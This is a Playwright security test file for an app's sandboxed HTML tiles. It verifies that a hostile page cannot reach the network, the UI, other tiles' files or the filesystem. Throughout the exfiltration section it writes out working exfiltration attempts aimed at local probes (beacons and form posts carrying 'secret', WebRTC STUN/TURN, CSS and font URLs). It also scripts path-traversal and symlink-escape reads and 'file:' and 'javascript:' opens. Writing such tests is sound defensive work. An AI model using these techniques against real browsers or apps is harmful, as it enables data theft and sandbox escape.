// Security: html tiles (static: the page's scripts never run, but Playwright's evaluate can act in
// the page's realm, which is what a renderer bug would get). From the page's realm: no request reaches the
// network (fetch, XHR, img, beacon, WebSocket, EventSource, form, CSS url(), fonts, prefetch,
// preconnect, preload, script, media, frames, objects, workers, ping, WebRTC STUN/TURN, location,
// meta refresh); window.open / target=_blank only through the confirm dialog (Cancel and Open
// paths; never without focus); the UI (parent/top) unreachable; the port never visible to the
// page; another tile's token unreadable; traversal, symlinks out, /_tie/ refused; navigating away
// fails the tile at once (no reload); opaque viewer frames still can't fetch.
// Hidden window: real clicks focus the frame.
import { mkdirSync, writeFileSync, rmSync, symlinkSync } from 'node:fs'
import { join } from 'node:path'
import { createServer } from 'node:net'
import { createSocket } from 'node:dgram'

export const hiddenWindow = true

export default async (ctx, h) => {
  const p = await h.probe(ctx)
  // Raw TCP and UDP listeners: connections that never become HTTP requests (WebSocket upgrades,
  // preconnect, TURN over TCP) and STUN packets.
  const tcpHits = []
  const tcp = createServer((s) => (tcpHits.push('tcp'), s.destroy()))
  await new Promise((r) => tcp.listen(0, '127.0.0.1', r))
  const tcpPort = tcp.address().port
  p.hits.length = 0
  const udpHits = []
  const udp = createSocket('udp4')
  udp.on('message', () => udpHits.push('udp'))
  await new Promise((r) => udp.bind(0, '127.0.0.1', r))
  const udpPort = udp.address().port

  const base = join(process.cwd(), 'tmp', `sechtml-${process.pid}`)
  const dir = join(base, 'site')
  mkdirSync(dir, { recursive: true })
  writeFileSync(join(base, 'secret.txt'), 'SECRET')
  symlinkSync(join(base, 'secret.txt'), join(dir, 'link.txt'))
  writeFileSync(join(dir, 'data.json'), '{"v": 1}')
  // Over the html cap (10 MB): a document of the folder main must not read whole; a large asset
  // is streamed (never read whole either) and arrives intact.
  writeFileSync(join(dir, 'big.html'), Buffer.alloc(10 * 1024 * 1024 + 1, 0x61))
  writeFileSync(join(dir, 'big.bin'), Buffer.alloc(12 * 1024 * 1024, 0x62))
  // The page records any message event carrying ports (the handshake must never reach it).
  const page = `<!doctype html><html><head><meta charset="utf-8"><title>Evil</title>
<script>window.__ports = 0; addEventListener('message', (e) => { if (e.ports.length) window.__ports++ }, true); document.addEventListener('message', () => {}, true)</script></head>
<body><h1 id="h">Evil</h1><a id="ext" href="${p.url}/link-click">ext</a> <a id="blank" href="${p.url}/blank" target="_blank">blank</a></body></html>`
  writeFileSync(join(dir, 'evil.html'), page)
  writeFileSync(join(dir, 'loop.html'), `<!doctype html><title>Loop</title><meta http-equiv="refresh" content="0;url=${p.url}/meta-loop">`)
  const cli = []
  try {
    const [t0] = (await h.list(ctx)).tiles.map((t) => t.id)
    const id = (await ctx.tie('add', join(dir, 'evil.html'), '--at', t0, '--side', 'r')).id
    const fr = await h.htmlFrame(ctx, id)
    const token = new URL(fr.url()).host
    await h.clickIn(ctx, fr, '#h') // focused: gesture requests would pass the focus rule

    // Own process, own origin (the token), not the UI's.
    const fs = (await h.frames(ctx)).filter((f) => f.url.startsWith(`tie-content://${token}/`))
    h.assert(fs.length === 1 && fs[0].outOfProcess && fs[0].origin === `tie-content://${token}`, `own process + origin: ${JSON.stringify(fs)}`)

    // The UI: unreachable. The handshake port: never seen by the page.
    const realm = await fr.evaluate(() => {
      const t = (fn) => {
        try {
          return String(fn())
        } catch (e) {
          return 'threw ' + e.name
        }
      }
      return { tie: typeof window.tie, parentDoc: t(() => parent.document.title), parentTie: t(() => parent.tie), topHref: t(() => top.location.href), ports: window.__ports }
    })
    h.assert(realm.tie === 'undefined' && [realm.parentDoc, realm.parentTie, realm.topHref].every((x) => x.startsWith('threw')) && realm.ports === undefined, `UI unreachable, page script never ran: ${JSON.stringify(realm)}`)
    await fr.evaluate(() => {
      try {
        top.location.href = 'https://example.com/top'
      } catch {}
    })

    // Exfiltration: every way a page loads or sends something, pointed at the probes. Two layers,
    // each checked: the document CSP refuses (violation events, below; forms: the sandbox; workers
    // from elsewhere: same-origin rule) and the UI session has no network (probes untouched, even
    // for what the CSP doesn't cover: WebRTC).
    await fr.evaluate(() => {
      window.__v = []
      document.addEventListener('securitypolicyviolation', (e) => window.__v.push(`${e.effectiveDirective} ${e.blockedURI}`))
    })
    await fr.evaluate(
      ({ u, tcpPort, udpPort }) => {
        const T = (fn) => {
          try {
            fn()
          } catch {}
        }
        const add = (html) => document.body.insertAdjacentHTML('beforeend', html)
        T(() => fetch(u + '/fetch').catch(() => {}))
        T(() => fetch(u + '/fetch-nocors', { mode: 'no-cors' }).catch(() => {}))
        T(() => {
          const x = new XMLHttpRequest()
          x.open('GET', u + '/xhr')
          x.send()
        })
        T(() => (new Image().src = u + '/img'))
        T(() => document.body.append(Object.assign(document.createElement('script'), { src: u + '/script-el.js' })))
        T(() => navigator.sendBeacon(u + '/beacon', 'secret'))
        T(() => new WebSocket(`ws://127.0.0.1:${tcpPort}/ws`))
        T(() => new EventSource(u + '/es'))
        T(() => new Worker(URL.createObjectURL(new Blob([`fetch('${u}/worker').catch(() => {}); try { importScripts('${u}/import') } catch {}`], { type: 'text/javascript' }))))
        T(() => new Worker(u + '/worker-src'))
        add(`<link rel="stylesheet" href="${u}/style"><link rel="prefetch" href="${u}/prefetch"><link rel="preload" as="script" href="${u}/preload"><link rel="preconnect" href="http://127.0.0.1:${tcpPort}"><link rel="dns-prefetch" href="http://127.0.0.1:${tcpPort}">`)
        add(`<style>@import url('${u}/import.css'); body { background: url('${u}/css-bg') } @font-face { font-family: X; src: url('${u}/font') } h1 { font-family: X }</style>`)
        add(`<div style="background: url('${u}/attr-bg'); width: 10px; height: 10px"></div>`)
        add(`<script src="${u}/script.js"></script><img src="${u}/img-tag"><audio src="${u}/audio" autoplay></audio><video src="${u}/video" poster="${u}/poster"></video>`)
        add(`<iframe src="${u}/iframe"></iframe><object data="${u}/object"></object><embed src="${u}/embed">`)
        add(`<svg><image href="${u}/svg-image" width="4" height="4"/></svg>`)
        T(() => {
          const f = Object.assign(document.createElement('form'), { action: u + '/form', method: 'POST' })
          f.append(Object.assign(document.createElement('input'), { name: 'x', value: 'secret' }))
          document.body.append(f)
          f.submit()
        })
        // <a ping> clicked, with the page stopping the bootstrap's handler (native navigation).
        T(() => {
          const a = Object.assign(document.createElement('a'), { href: 'data.json' })
          a.setAttribute('ping', u + '/ping')
          document.body.append(a)
          a.addEventListener('click', (e) => e.stopPropagation())
          a.click()
        })
        // WebRTC: STUN over UDP, TURN over TCP (not covered by connect-src).
        T(async () => {
          const pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:127.0.0.1:${udpPort}` }, { urls: `turn:127.0.0.1:${tcpPort}?transport=tcp`, username: 'u', credential: 'c' }] })
          pc.createDataChannel('x')
          await pc.setLocalDescription(await pc.createOffer())
        })
      },
      { u: p.url, tcpPort, udpPort },
    )
    // Every attempt refused (CSP violation events come in as the attempts run).
    let v
    await h.eventually(ctx, async () => {
      v = await (await h.htmlFrame(ctx, id)).evaluate(() => window.__v)
      for (const [dir, path] of [['connect-src', '/fetch'], ['connect-src', '/xhr'], ['connect-src', '/beacon'], ['connect-src', '/es'], ['connect-src', 'ws://'], ['img-src', '/img'], ['img-src', '/css-bg'], ['img-src', '/attr-bg'], ['img-src', '/svg-image'], ['style-src-elem', '/style'], ['style-src-elem', '/import.css'], ['font-src', '/font'], ['script-src-elem', '/script-el.js'], ['script-src-elem', '/preload'], ['default-src', '/prefetch'], ['connect-src', '/ping'], ['media-src', '/audio'], ['frame-src', p.url], ['object-src', p.url]])
        h.assert(v.some((x) => x.startsWith(dir + ' ') && x.includes(path)), `CSP refused ${dir} ${path}: ${JSON.stringify(v)}`)
    }, 8000)
    ctx.log('CSP violations:', JSON.stringify(v))
    await p.assertUntouched('exfiltration from page scripts', 1000)
    h.assert(!tcpHits.length && !udpHits.length, `raw connections reached: tcp ${tcpHits.length}, udp ${udpHits.length}`)
    h.assert(!(await h.tileOf(ctx, id)).error, 'page survived its attempts')
    const webrtc = await (await h.htmlFrame(ctx, id)).evaluate(() => typeof RTCPeerConnection)
    ctx.log('RTCPeerConnection in page:', webrtc)

    // Other tokens: another html tile's files unreadable (fetch, XHR, img). Own folder: readable.
    const other = (await ctx.tie('add', join(dir, 'evil.html'), '--at', id, '--side', 'b')).id
    const otherToken = new URL((await h.htmlFrame(ctx, other)).url()).host
    const f1 = await h.htmlFrame(ctx, id)
    const reads = await f1.evaluate(async ({ own, other }) => {
      const tryFetch = (u) => fetch(u).then((r) => (r.ok ? 'ok' : 'status ' + r.status), (e) => 'threw')
      const tryXhr = (u) => new Promise((r) => { const x = new XMLHttpRequest(); x.open('GET', u); x.onload = () => r(x.status === 200 ? 'ok' : 'status ' + x.status); x.onerror = () => r('error'); x.send() })
      const tryImg = (u) => new Promise((r) => Object.assign(new Image(), { onload: () => r('load'), onerror: () => r('error'), src: u }))
      return {
        own: await tryFetch('data.json'),
        otherFetch: await tryFetch(`tie-content://${other}/data.json`),
        otherXhr: await tryXhr(`tie-content://${other}/data.json`),
        otherImg: await tryImg(`tie-content://${other}/x.png`),
        up: await tryFetch('../secret.txt'),
        upEnc: await tryFetch('/%2e%2e/secret.txt'),
        upEnc2: await tryFetch('/..%2fsecret.txt'),
        link: await tryFetch('link.txt'),
        tie: await tryFetch('/_tie/markdown.js'),
        tieBoot: await tryFetch('/_tie/html-bootstrap.js'),
        root: await tryFetch('/'),
        bigDoc: await tryFetch('big.html'),
        bigAsset: await fetch('big.bin').then(async (r) => (r.ok ? (await r.arrayBuffer()).byteLength : 'status ' + r.status), () => 'threw'),
      }
    }, { own: token, other: otherToken })
    h.assert(reads.own === 'ok', `own folder readable: ${JSON.stringify(reads)}`)
    h.assert(reads.bigDoc === 'status 404' && /refused content document too large/.test(ctx.appLog()), `document over the cap refused: ${reads.bigDoc}`)
    h.assert(reads.bigAsset === 12 * 1024 * 1024, `large asset streamed whole: ${reads.bigAsset}`)
    for (const k of ['otherFetch', 'otherXhr', 'otherImg', 'up', 'upEnc', 'upEnc2', 'link', 'tie', 'tieBoot', 'root']) h.assert(reads[k] !== 'ok' && reads[k] !== 'load', `${k} refused: ${JSON.stringify(reads)}`)
    h.assert(/refused content outside root tie-content:\/\/\w+\/link\.txt/.test(ctx.appLog()), 'symlink out refused by main')
    await ctx.tie('close', other)

    // Opaque viewer frames (markdown, probe) still can't fetch their own token.
    const pr = (await ctx.tie('add', 'probe', '--cwd', dir)).id
    const pf = await h.probeFrame(ctx, pr)
    const opaque = await pf.evaluate((t) => fetch(`tie-content://${t}/data.json`).then(() => 'ok', () => 'threw'), new URL(pf.url()).host)
    h.assert(opaque === 'threw', `probe frame fetch: ${opaque}`)
    writeFileSync(join(dir, 'n.md'), '# n\n')
    const md = (await ctx.tie('add', join(dir, 'n.md'), '--at', id)).id
    const mf = await h.contentFrame(ctx, md)
    const mdFetch = await mf.evaluate(() => fetch(`${location.protocol}//${location.host}/n.md`).then(() => 'ok', () => 'threw'))
    h.assert(mdFetch === 'threw', `markdown frame fetch: ${mdFetch}`)
    for (const x of [pr, md]) await ctx.tie('close', x)

    // The web from the page: only through the dialog. Not focused: refused (gesture rule).
    const fe = await h.htmlFrame(ctx, id)
    await ctx.tie('focus', t0)
    await h.waitFor(ctx, () => ctx.page.evaluate((t0) => document.activeElement?.closest('.tile')?.dataset.id === t0, t0), 'keys to t0')
    await fe.evaluate((u) => window.open(u + '/nofocus'), p.url)
    await h.waitFor(ctx, async () => /refused request without focus t[a-z2-9]+ followLink/.test(ctx.appLog()), 'refusal logged')
    h.assert(!(await ctx.page.isVisible('.dialog.external-open')) && /refused request without focus t[a-z2-9]+ followLink/.test(ctx.appLog()), 'window.open without focus: refused, no dialog')
    // Focused: window.open (script, no click) → dialog; Cancel → nothing.
    await h.clickIn(ctx, fe, '#h')
    await fe.evaluate((u) => window.open(u + '/script-open?secret=1'), p.url)
    await h.waitFor(ctx, () => ctx.page.isVisible('.dialog.external-open'), 'dialog for window.open')
    h.assert((await ctx.page.textContent('.dialog.external-open .url')) === `${p.url}/script-open?secret=1`, 'full URL shown')
    h.assert((await ctx.page.evaluate(() => document.activeElement?.classList.contains('cancel'))), 'Cancel focused')
    // While it's open, more requests are dropped (no dialog pile-up).
    await fe.evaluate((u) => window.open(u + '/second'), p.url).catch(() => {})
    await ctx.sleep(300) // absence: no second dialog
    h.assert((await ctx.page.locator('.dialog.external-open').count()) === 1, 'one dialog at a time')
    await ctx.page.keyboard.press('Enter') // Enter = Cancel
    await h.eventually(ctx, async () => h.assert(!(await ctx.page.isVisible('.dialog.external-open')) && !ctx.appLog().includes(`external open ${p.url}`), 'Cancel: nothing opened'))
    // target=_blank link (real click) → dialog; Open → system browser (harness: logged, not loaded).
    await h.clickIn(ctx, fe, '#blank')
    await h.waitFor(ctx, () => ctx.page.isVisible('.dialog.external-open'), 'dialog for target=_blank')
    await ctx.page.click('.dialog .confirm')
    await h.waitFor(ctx, async () => ctx.appLog().includes(`external open ${p.url}/blank`), 'Open: external open')
    // Other schemes: refused before any dialog.
    await h.clickIn(ctx, fe, '#h')
    for (const u of ['file:///etc/hosts', 'javascript:alert(1)', 'x-app://run', 'smb://h/s']) await fe.evaluate((u) => window.open(u), u)
    await h.waitFor(ctx, async () => (ctx.appLog().match(/refused link t[a-z2-9]+ scheme/g) ?? []).length >= 3, 'schemes refused (logged)')
    h.assert(!(await ctx.page.isVisible('.dialog.external-open')) && (ctx.appLog().match(/refused link t[a-z2-9]+ scheme/g) ?? []).length >= 3, 'other schemes refused')
    await p.assertUntouched('opens', 300)

    // Nav lock: other tokens, /_tie/ files: cancelled (frame stays, no error).
    for (const target of [`tie-content://${'e'.repeat(32)}/evil.html`, '/_tie/markdown.html']) {
      const n = (ctx.appLog().match(/blocked navigation subframe/g) ?? []).length
      await (await h.htmlFrame(ctx, id)).evaluate((t) => (location.href = t), target).catch(() => {})
      await h.waitFor(ctx, async () => (ctx.appLog().match(/blocked navigation subframe/g) ?? []).length > n, `location ${target}: blocked (logged)`)
      await ctx.sleep(300) // absence: no error, no other document follows the block
      const pg = (await h.tileOf(ctx, id)).page
      h.assert(pg.path.endsWith('/evil.html') && !(await h.tileOf(ctx, id)).error, `location ${target}: still evil.html, no error: ${JSON.stringify(pg)}`)
    }
    // Navigating away (http): blocked by the UI's frame-src; the tile fails at once, naming the
    // target; no reload (decision 2026-10-21).
    await (await h.htmlFrame(ctx, id)).evaluate((t) => (location.href = t), `${p.url}/location`).catch(() => {})
    await h.waitFor(ctx, async () => /^Page navigated away: /.test((await h.tileOf(ctx, id)).error ?? ''), 'navigation away → error')
    h.assert((await h.tileOf(ctx, id)).error.includes(`${p.url}/location`), 'error names the target')
    h.assert(/document navigation failed \w+ -?\d+/.test(ctx.appLog()), 'failed navigation reported by main')
    // Meta refresh away on load: error at once, no reload loop.
    const loop = (await ctx.tie('add', join(dir, 'loop.html'), '--at', t0)).id
    await h.waitFor(ctx, async () => /^Page navigated away: .*meta-loop/.test((await h.tileOf(ctx, loop)).error ?? ''), 'meta refresh → error', 8000)
    h.assert(!/navigation failed, reloading/.test(ctx.appLog()), 'never reloaded')
    await p.assertUntouched('navigation away', 500)
    h.assert(!tcpHits.length && !udpHits.length, 'no raw connections')
  } finally {
    await p.close()
    tcp.close()
    udp.close()
    rmSync(base, { recursive: true, force: true })
  }
}
